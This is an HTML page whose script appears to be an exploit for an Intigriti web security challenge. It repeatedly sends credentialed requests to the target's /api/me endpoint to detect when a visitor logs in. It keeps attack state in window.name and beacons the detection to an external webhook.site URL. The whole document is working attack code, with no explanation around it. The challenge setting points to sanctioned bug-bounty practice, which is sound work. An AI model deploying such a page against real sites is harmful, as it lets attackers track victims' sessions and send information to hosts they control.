<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";

async function checkAuth() {
  try {
    const r = await fetch(
      "https://challenge-0126.intigriti.io/api/me",
      { credentials: "include" }
    );
    return r.ok;
  } catch {
    return false;
  }
}

async function authWatcher() {
  const data = JSON.parse(window.name);

  if (data.state === "TRIGGERED") return;

  const loggedIn = await checkAuth();

  if (!loggedIn) {
    data.state = "WAIT_AUTH";
    window.name = JSON.stringify(data);
    return;
  }

  // ðŸ”” THIS IS THE MOMENT LOGIN HAPPENED
  data.state = "AUTH_READY";
  data.authAt = Date.now();
  window.name = JSON.stringify(data);

  new Image().src =
    WEBHOOK + "?stage=auth_detected&ts=" + data.authAt;
}

setInterval(authWatcher, 5000);
</script>

</body>
</html>
